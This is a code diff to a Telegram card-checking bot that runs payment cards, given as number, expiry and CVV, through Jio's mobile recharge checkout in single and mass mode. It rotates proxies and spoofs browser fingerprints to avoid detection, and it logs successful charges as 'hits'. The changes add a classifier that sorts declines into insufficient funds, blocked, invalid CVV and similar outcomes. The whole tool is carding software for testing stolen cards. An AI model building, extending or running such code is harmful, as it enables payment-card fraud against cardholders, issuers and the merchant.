@@ -1,4 +1,4 @@
-# Jio Recharge Bot — curl_cffi version
+# Jio Recharge Bot — full version with decline classification
 import telebot, re, time, os, sys, json, threading, random, datetime
 from concurrent.futures import ThreadPoolExecutor
 from curl_cffi import requests
@@ -103,7 +103,7 @@ def proxy_dict(entry):
 
 load_proxies()
 
-# ================= PROXY COMMAND =================
+# ================= PROXY COMMANDS =================
 @bot.message_handler(commands=['proxy'])
 def proxy_command(message):
     uid = message.from_user.id
@@ -175,7 +175,7 @@ def check_proxy_cmd(message):
     def chk(p):
         try:
             r = requests.get("https://api.ipify.org?format=json",
-                             proxies=proxy_dict(p), timeout=10, impersonate="chrome131", verify=False)
+                             proxies=proxy_dict(p), timeout=10, impersonate="chrome124", verify=False)
             if r.status_code == 200: return p
         except: pass
         return None
@@ -188,12 +188,11 @@ def check_proxy_cmd(message):
 
 # ================= JIO CORE =================
 PROFILES = [
-    {"imp":"chrome131","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","ch":'"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"',"plat":'"Windows"',"mob":"?0"},
     {"imp":"chrome124","ua":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","ch":'"Google Chrome";v="124", "Not_A Brand";v="8", "Chromium";v="124"',"plat":'"macOS"',"mob":"?0"},
     {"imp":"chrome123","ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36","ch":'"Google Chrome";v="123", "Not_A Brand";v="8", "Chromium";v="123"',"plat":'"Linux"',"mob":"?0"},
-    {"imp":"edge101","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36 Edg/101.0.0.0","ch":'"Microsoft Edge";v="101", "Not_A Brand";v="8", "Chromium";v="101"',"plat":'"Windows"',"mob":"?0"},
     {"imp":"chrome120","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","ch":'"Google Chrome";v="120", "Not_A Brand";v="8", "Chromium";v="120"',"plat":'"Windows"',"mob":"?0"},
-    {"imp":"firefox135","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0","ch":'"Firefox";v="135", "Not_A Brand";v="8"',"plat":'"Windows"',"mob":"?0"},
+    {"imp":"edge101","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36 Edg/101.0.0.0","ch":'"Microsoft Edge";v="101", "Not_A Brand";v="8", "Chromium";v="101"',"plat":'"Windows"',"mob":"?0"},
+    {"imp":"firefox133","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0","ch":'"Firefox";v="133", "Not_A Brand";v="8"',"plat":'"Windows"',"mob":"?0"},
 ]
 SCREENS = [
     {"h":1080,"w":1920,"depth":24},{"h":900,"w":1440,"depth":30},
@@ -231,6 +230,59 @@ def parse_card_line(line):
 
 def card_label(card):
     return f"{card['pan']}|{card['exp_month']}|{card['exp_year'][-2:]}|{card['cvv']}"
+
+def classify_decline(status, message, reason):
+    """Return (status_key, formatted_message)."""
+    combined = f"{status} {message} {reason}".lower()
+
+    if status in ("SUCCESS", "APPROVED"):
+        return "success", "Recharge successful."
+
+    if any(k in combined for k in ["3ds", "otp", "authenticate", "challenge"]):
+        return "3ds", "3DS required"
+
+    if any(k in combined for k in ["insufficient", "not sufficient", "no sufficient",
+                                    "low balance", "not enough funds", "balance not available",
+                                    "fund shortage"]):
+        return "insufficient", f"Insufficient Funds — {message[:80]}"
+
+    if any(k in combined for k in ["expired", "expiry", "expiration", "card_expired"]):
+        return "expired", f"Card Expired — {message[:80]}"
+
+    if any(k in combined for k in ["cvv", "cvc", "security code", "invalid_cvv"]):
+        return "invalid_cvv", f"Invalid CVV — {message[:80]}"
+
+    if any(k in combined for k in ["invalid card", "invalid_card", "card number",
+                                    "invalid_pan", "pan invalid"]):
+        return "invalid_card", f"Invalid Card — {message[:80]}"
+
+    if any(k in combined for k in ["do not honor", "do_not_honor", "issuer_decline",
+                                    "declined by issuer", "restricted card"]):
+        return "issuer_decline", f"Do Not Honor — {message[:80]}"
+
+    if any(k in combined for k in ["blocked", "stolen", "lost", "pickup", "pick up",
+                                    "card_blocked", "card_restricted"]):
+        return "blocked", f"Card Blocked — {message[:80]}"
+
+    if any(k in combined for k in ["not permitted", "not allowed", "international",
+                                    "online transaction", "ecommerce disabled",
+                                    "not enabled for online"]):
+        return "not_permitted", f"Not Permitted — {message[:80]}"
+
+    if any(k in combined for k in ["limit", "exceeded", "over limit", "transaction_limit"]):
+        return "limit_exceeded", f"Limit Exceeded — {message[:80]}"
+
+    if any(k in combined for k in ["velocity", "too many", "rate limit", "max attempts"]):
+        return "velocity", f"Velocity Limit — {message[:80]}"
+
+    if any(k in combined for k in ["processor", "network", "timeout", "gateway",
+                                    "system error", "try again", "temporarily"]):
+        return "processor_error", f"Processor Error — {message[:80]}"
+
+    if status == "ISSUER_DECLINE":
+        return "issuer_decline", f"Issuer Declined — {message[:80]}"
+
+    return "failed", (message or reason or "Declined")[:120]
 
 def jio_check(phone, amount, card, proxy_str=None):
     meta = {"merchant": "Jio Recharge", "amount": amount, "plan": ""}
@@ -421,7 +473,8 @@ def jio_check(phone, amount, card, proxy_str=None):
             return "error", f"Card confirmation failed: {str(e)[:80]}", meta
 
         if not cd.get("status"):
-            return "failed", cd.get("message", "Card confirmation failed")[:150], meta
+            msg = cd.get("message", "Card confirmation failed")
+            return classify_decline("CONFIRM_FAIL", msg, ""), meta
 
         html_form = cd.get("htmlForm", "")
         if not html_form:
@@ -446,11 +499,16 @@ def jio_check(phone, amount, card, proxy_str=None):
 
         txt = r.text.lower()
         url_lower = r.url.lower()
+
         if "3dsecure" in txt or "authentication" in txt or "otp" in txt or "3ds" in url_lower:
             return "3ds", "3DS required", meta
-        if "declined" in txt or "insufficient" in txt or "do not honor" in txt:
-            dm = re.search(r'(declined[^<]{0,80}|insufficient[^<]{0,80}|do not honor[^<]{0,80})', txt)
-            return "failed", (dm.group(1) if dm else "Declined by issuer")[:120], meta
+
+        if "insufficient" in txt or "not enough funds" in txt or "low balance" in txt:
+            return "insufficient", "Insufficient Funds (bank page)", meta
+
+        if "declined" in txt or "do not honor" in txt:
+            dm = re.search(r'(declined[^<]{0,80}|do not honor[^<]{0,80})', txt)
+            return classify_decline("ISSUER_DECLINE", dm.group(1) if dm else "Declined by issuer", ""), meta
 
         m = re.search(r'x-gl-token=([^&\s"\'\\]+)', r.url + r.text)
         if not m:
@@ -518,16 +576,31 @@ def jio_check(phone, amount, card, proxy_str=None):
         message = result.get("message", "")
         reason = result.get("reasonCode", "")
 
-        if status in ("SUCCESS", "APPROVED"):
-            return "success", "Recharge successful.", meta
-        if status == "ISSUER_DECLINE":
-            return "failed", f"Declined: {message[:100]}", meta
-        if "3ds" in (status + message).lower() or "otp" in message.lower() or "authenticate" in message.lower():
-            return "3ds", "3DS required.", meta
-        return "failed", (message or reason or "Declined")[:120], meta
+        key, msg = classify_decline(status, message, reason)
+        return key, msg, meta
 
     except Exception as e:
         return "error", f"Check failed: {str(e)[:100]}", meta
+
+# ================= STATUS HEADS =================
+def status_head(status):
+    heads = {
+        "success": "✅ <b>HIT SUCCESSFUL</b>",
+        "3ds": "🔥 <b>3DS REQUIRED</b>",
+        "insufficient": "💸 <b>INSUFFICIENT FUNDS</b>",
+        "expired": "📅 <b>CARD EXPIRED</b>",
+        "invalid_cvv": "🔒 <b>INVALID CVV</b>",
+        "invalid_card": "❌ <b>INVALID CARD</b>",
+        "issuer_decline": "🚫 <b>DO NOT HONOR</b>",
+        "blocked": "🔴 <b>CARD BLOCKED</b>",
+        "not_permitted": "⛔ <b>NOT PERMITTED</b>",
+        "limit_exceeded": "📊 <b>LIMIT EXCEEDED</b>",
+        "velocity": "⚠️ <b>VELOCITY LIMIT</b>",
+        "processor_error": "🔧 <b>PROCESSOR ERROR</b>",
+        "failed": "❌ <b>DECLINED</b>",
+        "error": "⚠️ <b>ERROR</b>",
+    }
+    return heads.get(status, "⚠️ <b>UNKNOWN</b>")
 
 # ================= COMMANDS =================
 @bot.message_handler(commands=['start'])
@@ -544,6 +617,7 @@ def start(message):
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"⚡ /jio — Single check\n"
         f"📦 /mjio — Mass check\n"
+        f"🌐 /proxy — Manage proxies\n"
         f"👤 /info — Account info",
         parse_mode="HTML")
 
@@ -584,16 +658,10 @@ def jio_single(message):
     safe_name = str(message.from_user.first_name).replace("<","").replace(">","").replace("&","")
 
     if status == "success":
-        head = "✅ <b>HIT SUCCESSFUL</b>"
         with open(HITS_FILE, 'a', encoding="utf-8") as f:
             f.write(f"{phone} Rs{amount} {card_label(card)} - {response}\n")
-    elif status == "3ds":
-        head = "🔥 <b>3DS REQUIRED</b>"
-    elif status == "failed":
-        head = "❌ <b>DECLINED</b>"
-    else:
-        head = "⚠️ <b>ERROR</b>"
 
+    head = status_head(status)
     res = (
         f"{head}\n"
         f"━━━━━━━━━━━━━━━━━\n"
@@ -671,7 +739,8 @@ def mjio_mass(message):
     total = len(cards)
 
     results = {"hits":0,"hits_list":[],"declined":0,"declined_list":[],
-               "3ds":0,"3ds_list":[],"error":0,"error_list":[],"checked":0}
+               "3ds":0,"3ds_list":[],"error":0,"error_list":[],"checked":0,
+               "insufficient":0,"insufficient_list":[]}
     start_time = time.time()
     last_update = [0]
     ulock = threading.Lock()
@@ -684,6 +753,7 @@ def mjio_mass(message):
                 f"┣ 📦 Progress ➜ {results['checked']}/{total}\n"
                 f"┣ ✅ Hits ➜ {results['hits']}\n"
                 f"┣ 🔥 3DS ➜ {results['3ds']}\n"
+                f"┣ 💸 Insufficient ➜ {results['insufficient']}\n"
                 f"┣ ❌ Declined ➜ {results['declined']}\n"
                 f"┣ ⚠️ Errors ➜ {results['error']}\n"
                 f"┗ ⏱️ Time ➜ {m:02d}:{s:02d}\n"
@@ -706,24 +776,27 @@ def mjio_mass(message):
         except Exception as e:
             status, response = "error", f"Failed: {e}"
         entry = f"{card_label(card)} - {response}"
+
         if status == "success":
             results["hits"] += 1; results["hits_list"].append(entry)
             with open(HITS_FILE, 'a', encoding="utf-8") as f:
                 f.write(f"{phone} Rs{amount} {card_label(card)} - {response}\n")
         elif status == "3ds":
             results["3ds"] += 1; results["3ds_list"].append(entry)
-        elif status == "failed":
+        elif status == "insufficient":
+            results["insufficient"] += 1; results["insufficient_list"].append(entry)
+        elif status in ("expired","invalid_cvv","invalid_card","issuer_decline","blocked",
+                        "not_permitted","limit_exceeded","velocity","processor_error","failed"):
             results["declined"] += 1; results["declined_list"].append(entry)
         else:
             results["error"] += 1; results["error_list"].append(entry)
         results["checked"] += 1
 
-        if status in ["success", "3ds"]:
-            head = "✅ <b>HIT SUCCESSFUL</b>" if status == "success" else "🔥 <b>3DS REQUIRED</b>"
+        if status in ("success", "3ds", "insufficient"):
             safe = str(response).replace("<","").replace(">","").replace("&","")
             safe_name = str(message.from_user.first_name).replace("<","").replace(">","").replace("&","")
             single = (
-                f"{head}\n━━━━━━━━━━━━━━━━━\n"
+                f"{status_head(status)}\n━━━━━━━━━━━━━━━━━\n"
                 f"👤 <b>Phone</b> ━ <code>{phone}</code>\n"
                 f"💰 <b>Amount</b> ━ ₹{amount}\n"
                 f"💳 <b>Card</b> ━ <code>{card_label(card)}</code>\n"
@@ -762,14 +835,16 @@ def mjio_mass(message):
 
         lines = []
         for sec, lbl in [("hits_list","HITS"),("3ds_list","3DS"),
+                         ("insufficient_list","INSUFFICIENT FUNDS"),
                          ("declined_list","DECLINED"),("error_list","ERRORS")]:
-            if results[sec]:
+            if results.get(sec):
                 lines.append(f"{lbl}:"); lines.extend(results[sec]); lines.append("")
         if lines:
             content = "\n".join(lines)
             fcap = (f"📊 <b>Results</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                     f"┣ ✅ Hits ➜ {results['hits']}\n"
                     f"┣ 🔥 3DS ➜ {results['3ds']}\n"
+                    f"┣ 💸 Insufficient ➜ {results['insufficient']}\n"
                     f"┣ ❌ Declined ➜ {results['declined']}\n"
                     f"┣ ⚠️ Errors ➜ {results['error']}\n"
                     f"┗ 📦 Total ➜ {results['checked']}")
